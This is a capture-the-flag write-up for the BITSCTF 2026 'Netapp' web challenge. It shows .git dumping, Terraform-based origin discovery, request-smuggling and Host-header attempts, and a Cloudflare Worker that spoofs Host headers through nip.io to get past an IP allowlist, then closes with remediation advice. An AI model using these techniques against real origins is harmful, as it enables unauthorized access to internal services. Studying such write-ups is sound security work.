# BITSCTF 2026 Web Write-up: Netapp

**Category:** Web Exploitation
**Objective:** Bypass Edge and Cloud firewalls to access a restricted, internal-only service and retrieve the flag.
**Techniques Used:** Directory Fuzzing, Git Dumper, Source Code Analysis, Bring Your Own Cloudflare (BYOC), SSRF Bypass via Wildcard DNS.

## Executive Summary

The "Netapp" challenge presented a web portal boasting about its internal services being protected. The core vulnerability stemmed from an exposed `.git` directory that leaked Terraform infrastructure configurations. This leak revealed the backend AWS EC2 instance IP and a flawed AWS Security Group that trusted *any* traffic originating from Cloudflare's IP ranges. By weaponizing a custom Cloudflare Worker and bypassing Cloudflare's internal IP-fetching restrictions using `nip.io`, we successfully spoofed the internal routing and accessed the restricted `flag-service`.

---

## Step 1: Reconnaissance & Enumeration

### 1.1 — Initial Surface Inspection

Initial inspection of `https://netapp.bitskrieg.in` revealed a service portal listing three services:

| Service | Status |
|---|---|
| Web Portal | ONLINE |
| Auth Gateway | ONLINE |
| flag-service | **INTERNAL** |

A note on the page stated: *"All public endpoints are proxied through our edge network. Internal services are only accessible through our vpn."*

Response headers immediately identified **Cloudflare** as the CDN/edge proxy (HTTP/2, `server: cloudflare`, `cf-ray`, `cf-cache-status: HIT`, `alt-svc: h3`).

### 1.2 — Manual Endpoint Enumeration

We exhaustively probed common paths by hand, all returning `HTTP/2 404` with `content-length: 0`:

```bash
for p in /flag-service /flag-service/ /flag /internal /admin /auth /auth-gateway \
         /api /api/flag /api/services /proxy /gateway /v1/flag; do
  curl -sS -o /dev/null -w "%{http_code} %{size_download}  $p\n" "https://netapp.bitskrieg.in$p"
done
```

All returned `404 0`, confirming the origin only served a single static page at `/`.

### 1.3 — HTTP Method Fingerprinting

We tested various HTTP methods against the root to fingerprint the backend:

```bash
for method in GET POST PUT PATCH DELETE OPTIONS TRACE CONNECT; do
  code=$(curl -sS -X "$method" -o /dev/null -w "%{http_code}" https://netapp.bitskrieg.in/)
  echo "$method / => $code"
done
```

| Method | Status |
|---|---|
| GET | 200 |
| POST, PUT, PATCH, DELETE, OPTIONS | **405** |
| TRACE | 405 |
| CONNECT | 400 |

The `405 Method Not Allowed` on POST/OPTIONS confirmed there was an actual application backend, not just a static file server.

### 1.4 — Header Manipulation Attempts

We attempted to bypass access controls using IP-spoofing headers across all candidate internal paths. Every combination returned `404`:

```bash
for p in /flag-service /flag /internal /admin /auth /auth-gateway; do
  # No headers (baseline)
  curl -sS -o /dev/null -w "%{http_code}" "https://netapp.bitskrieg.in$p"
  # Spoofed internal IPs
  curl -sS -o /dev/null -w "%{http_code}" "https://netapp.bitskrieg.in$p" \
    -H 'X-Forwarded-For: 10.0.0.1' -H 'X-Real-IP: 10.0.0.1' -H 'Client-IP: 10.0.0.1'
  curl -sS -o /dev/null -w "%{http_code}" "https://netapp.bitskrieg.in$p" \
    -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'
done
```

We also tried path-override headers (`X-Original-URL`, `X-Rewrite-URL`) — all returned the standard `200` portal page with no routing change.

### 1.5 — Directory Fuzzing

We initiated directory fuzzing using `ffuf` and the standard `common.txt` wordlist to map the application's attack surface.

```bash
ffuf -u https://netapp.bitskrieg.in/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -mc all -fc 404 -t 50 -timeout 10
```

Results:

| Path | Status | Size |
|---|---|---|
| (empty — root) | 200 | 3243 |
| `.git/HEAD` | **200** | 21 |
| `index` | 307 → `/` | 0 |
| `index.html` | 307 → `/` | 0 |
| `robots.txt` | 200 | 1248 |

`robots.txt` turned out to be Cloudflare's standard copyright-signal boilerplate — no hidden paths. The real gold was `.git/HEAD`.

---

## Step 2: Source Code Extraction

### 2.1 — Git Repository Dumping

With an exposed `.git` directory confirmed, we utilized `git-dumper` to recursively download the repository and reconstruct the version history locally.

```bash
git-dumper https://netapp.bitskrieg.in/.git/ /tmp/netapp_git
```

### 2.2 — Repository Inspection

The repository contained a single commit by author `Krish <185198368+krxsh0x@users.noreply.github.com>` with the message `initial commit`. We verified there was no hidden history:

```bash
cd /tmp/netapp_git
git log --oneline --all        # → 52f7105 (HEAD -> main) initial commit
git reflog                     # → single entry
git fsck                       # → clean
```

We also manually inspected every git object (6 total: 1 commit, 2 trees, 3 blobs) — no orphaned objects or stashed secrets:

```bash
find .git/objects -type f       # 6 objects
for obj in $(find .git/objects -type f | sed 's|.git/objects/||;s|/||'); do
  echo "=== $obj ==="
  git cat-file -t "$obj"
  git cat-file -p "$obj" | head -n 5
done
```

File tree:

```
/tmp/netapp_git/
├── index.html                           # The portal page
└── flag-service/
    ├── aws-security-group.tf            # AWS SG config
    └── bitsctf-2026-vpn-only.tf         # Cloudflare firewall rule
```

---

## Step 3: Infrastructure Analysis (The Vulnerability)

We analyzed two critical Terraform files that mapped out the target's defense architecture:

### 3.1 — `bitsctf-2026-vpn-only.tf`

This file defined a Cloudflare Firewall rule designed to block any traffic attempting to reach `bitsctf-2026.hvijay.dev` unless it originated from their internal VPN IP. This explained our initial 403 Forbidden errors.

```hcl
resource "cloudflare_filter" "vpn_access_filter" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Filter for allowing only VPN access to bitsctf-2026.hvijay.dev"
  body        = "(http.host eq \"bitsctf-2026.hvijay.dev\") and (ip.src ne 0.0.0.0)"
}

resource "cloudflare_firewall_rule" "vpn_access_rule" {
  zone_id     = data.cloudflare_zone.example.id
  description = "Allow only VPN Access."
  action      = "block"
  priority    = 1
  filter      = cloudflare_filter.vpn_access_filter.id
}
```

We confirmed this by resolving and accessing the hostname directly:

```bash
dig +short bitsctf-2026.hvijay.dev A
# → 104.21.76.231, 172.67.202.17  (Cloudflare)

curl -i https://bitsctf-2026.hvijay.dev/
# → HTTP/2 403 — "Attention Required! | Cloudflare" — "Sorry, you have been blocked"
```

### 3.2 — `aws-security-group.tf`

This file contained the fatal misconfiguration. It revealed the direct IP address of the backend AWS EC2 instance (`3.208.18.209`). It also defined an AWS Security Group named `allow-cloudflare-only` that restricted all inbound HTTP/HTTPS traffic to Cloudflare's published IP ranges.

```hcl
# EC2 instance IP - 3.208.18.209

resource "aws_security_group" "cf_only_web" {
  name        = "allow-cloudflare-only"
  description = "Allow HTTP/HTTPS only from Cloudflare"

  ingress {
    description = "HTTP from Cloudflare"
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = local.cloudflare_ips
  }
  # ... HTTPS ingress identical ...
}
```

**The Flaw:** The AWS Security Group validated that incoming traffic came from *a* Cloudflare IP, but it did not validate that the traffic was securely routed through the *target's specific Cloudflare zone*.

---

## Step 4: Failed Bypass Attempts (The Rabbit Holes)

Before arriving at the BYOC solution, we exhausted every "cheaper" bypass technique. Documenting these is useful — both for learning and to show why the intended solution required an attacker-controlled Cloudflare Worker.

### 4.1 — Direct Origin Access

```bash
nmap -Pn -T4 --top-ports 1000 3.208.18.209
# PORT   STATE    SERVICE
# 22/tcp open     ssh        ← Only SSH reachable
# 80/tcp filtered
# 443/tcp filtered

curl --max-time 10 http://3.208.18.209/   # → timeout (SG blocks our IP)
```

We also scanned for non-standard web ports (3000, 5000, 8000, 8080, 8443, 9000) — all filtered.

### 4.2 — Cloudflare Firewall Bypass via Host Header Tricks

Since the firewall expression uses case-sensitive `eq` matching on `http.host`, we tried multiple header tricks:

| Technique | Result |
|---|---|
| Uppercase Host (`BITSCTF-2026.HVIJAY.DEV`) | 403 — Cloudflare normalizes to lowercase |
| Trailing FQDN dot (`bitsctf-2026.hvijay.dev.`) | 403 — Cloudflare strips trailing dot |
| Port in Host (`bitsctf-2026.hvijay.dev:443`) | 403 — still matched |
| HTTP/1.0 without Host header | 403 — Cloudflare infers from SNI |
| HTTP/1.1 with forced casing | 403 — Cloudflare normalizes before firewall eval |
| Tab character in Host value | 400 Bad Request |

### 4.3 — Host Header Routing Through `netapp.bitskrieg.in`

We attempted to ride on `netapp.bitskrieg.in`'s unblocked Cloudflare zone while sneaking the target Host header through:

```bash
# Double Host injection
curl --http1.1 https://netapp.bitskrieg.in/ \
  -H "Host: netapp.bitskrieg.in" \
  -H "Host: bitsctf-2026.hvijay.dev"
# → 200 (portal page — CF used the first Host, origin ignored the second)

# Absolute URI smuggling
curl --http1.1 --request-target "http://bitsctf-2026.hvijay.dev/" \
  https://netapp.bitskrieg.in/ -H "Host: netapp.bitskrieg.in"
# → 403 Forbidden (CF detected the misrouting)

# X-Forwarded-Host override
curl https://netapp.bitskrieg.in/ -H "X-Forwarded-Host: bitsctf-2026.hvijay.dev"
# → 200 (portal page — origin didn't honor the override)
```

### 4.4 — HTTP Request Smuggling (CL.TE)

We attempted CL.TE desync through Cloudflare to inject a second request with the target Host:

```python
smuggled = b'GET / HTTP/1.1\r\nHost: bitsctf-2026.hvijay.dev\r\nConnection: close\r\n\r\n'
body = b'0\r\n\r\n' + smuggled
# POST with Content-Length = len(body), Transfer-Encoding: chunked
```

Result: `400 Bad Request` — Cloudflare blocks conflicting CL/TE headers.

### 4.5 — WebSocket & H2C Upgrade Smuggling

```python
# WebSocket upgrade attempt
request = b'GET / HTTP/1.1\r\nHost: netapp.bitskrieg.in\r\n'
         b'Upgrade: websocket\r\nConnection: Upgrade\r\n...\r\n'
# → 200 OK (no upgrade, standard response — no WebSocket support)

# H2C cleartext upgrade
request = b'GET / HTTP/1.1\r\nHost: netapp.bitskrieg.in\r\n'
         b'Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n...\r\n'
# → 200 OK (Cloudflare stripped the upgrade headers)
```

### 4.6 — Certificate Transparency & Subdomain Enumeration

We queried CT logs for `hvijay.dev` subdomains:

```bash
curl -sS "https://crt.sh/?q=%.hvijay.dev&output=json" | python3 -c "..."
# Results:
# *.hvijay.dev
# bitsctf-2026.hvijay.dev    (our target — blocked)
# ctftestthing.hvijay.dev    (interesting!)
# keylogger.hvijay.dev
# www.hvijay.dev
```

`ctftestthing.hvijay.dev` resolved to the same Cloudflare IPs and was *not* blocked by the firewall rule. However, every path returned `301 → http://php/?code=null` — a stale redirect from an old project, not useful.

### 4.7 — DNS & `.well-known` Enumeration

```bash
# .well-known paths — all 404
for p in openid-configuration security.txt acme-challenge change-password; do
  curl -o /dev/null -w "%{http_code}" "https://netapp.bitskrieg.in/.well-known/$p"
done

# Terraform state files — all 404
for f in terraform.tfstate .terraform/terraform.tfstate terraform.tfstate.backup; do
  curl -o /dev/null -w "%{http_code}" "https://netapp.bitskrieg.in/$f"
done

# Alternate Cloudflare-supported ports on the portal (8080, 8443, 2053, etc.)
# → All served the same portal HTML
```

**Takeaway:** None of these "free" bypass techniques worked. The Cloudflare edge was properly normalizing headers and blocking smuggling. The **only** viable path was to place our own traffic *behind* Cloudflare's IP ranges.

---

## Step 5: Exploitation via Bring Your Own Cloudflare (BYOC)

Directly curling the EC2 IP (`3.208.18.209`) resulted in a timeout because our local IP was dropped by the AWS Security Group.

To bypass this, we executed a **BYOC (Bring Your Own Cloudflare)** attack. By deploying our own Cloudflare Worker, we could force our HTTP requests to originate from Cloudflare's network, thereby satisfying the AWS Security Group's strict IP allowlist.

Additionally, because we controlled the Worker, we could inject arbitrary `Host` headers to bypass the VPN filter (which only existed on the target's Cloudflare edge) and trick the backend reverse proxy into routing us to the internal application.

### Overcoming Cloudflare Error 1003

Our initial Worker script attempted to fetch the raw IP directly (`http://3.208.18.209/`). However, Cloudflare Workers employ a security mechanism that blocks `fetch()` requests to raw IP addresses to prevent Server-Side Request Forgery (SSRF), resulting in an `Error 1003: Direct IP access not allowed`.

To bypass this restriction, we utilized `nip.io`, a wildcard DNS service that resolves IP-based subdomains back to the IP itself. By requesting `http://3.208.18.209.nip.io`, Cloudflare parsed a valid Fully Qualified Domain Name (FQDN), allowing the fetch to execute.

### The Final Payload

We wrote and deployed the following Cloudflare Worker script (`index.js`):

```javascript
export default {
  async fetch(request) {
    const url = new URL(request.url);
    
    // Bypass Cloudflare's Error 1003 (Direct IP block) using nip.io
    const targetUrl = "http://3.208.18.209.nip.io"; 
    const fetchUrl = targetUrl + url.pathname;

    // Dynamically grab the Host to spoof from query parameters
    const hostToSpoof = url.searchParams.get("shost") || "flag-service";

    const modifiedRequest = new Request(fetchUrl, {
      method: request.method,
      headers: request.headers,
      body: request.body
    });

    // Inject the spoofed Host header for backend routing
    modifiedRequest.headers.set("Host", hostToSpoof);

    try {
      return await fetch(modifiedRequest);
    } catch (e) {
      return new Response("Error fetching origin: " + e.message, { status: 500 });
    }
  }
}
```

## Step 6: Capturing the Flag

With the Worker deployed to our `*.workers.dev` subdomain, we issued a request from our terminal, passing the target internal service as the `shost` parameter:

```bash
curl -i -sS "https://withered-term-200b.YOUR_DOMAIN.workers.dev/?shost=flag-service"
```

The request successfully traversed Cloudflare's network, bypassed the AWS Security Group, bypassed the target's VPN edge filter, and was routed by the backend proxy directly to the internal service.

**Flag:** `BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}`

---

## Attack Flow Diagram

```
┌──────────┐     HTTPS      ┌──────────────────┐     HTTP      ┌───────────────────┐
│ Attacker │ ─────────────→ │  Our Cloudflare   │ ────────────→ │  Origin EC2       │
│ Terminal │                │  Worker           │   Host:       │  3.208.18.209     │
│          │  curl worker   │  (*.workers.dev)  │  flag-service │                   │
└──────────┘                │                   │               │  ┌─────────────┐  │
                            │  fetch() →        │  from CF IP   │  │ flag-service│  │
                            │  3.208.18.209     │  ✓ SG allows  │  │ (internal)  │  │
                            │  .nip.io          │               │  └──────┬──────┘  │
                            └──────────────────┘               │         │ flag     │
                                                                └─────────┼─────────┘
                                                                          ↓
                                                         BITSCTF{3v3n_41_15_84d_47_c0nf19u24710n}
```

---

## Remediation / Takeaways

To secure an origin server behind Cloudflare, relying solely on IP allowlists is insufficient due to the shared nature of Cloudflare's infrastructure. Defenders should implement **Authenticated Origin Pulls** (requiring mutual TLS between Cloudflare and the origin) or utilize **Cloudflare Tunnels** (`cloudflared`) to establish a secure, outbound-only connection to the edge network, removing the need to expose the origin IP to the public internet entirely.
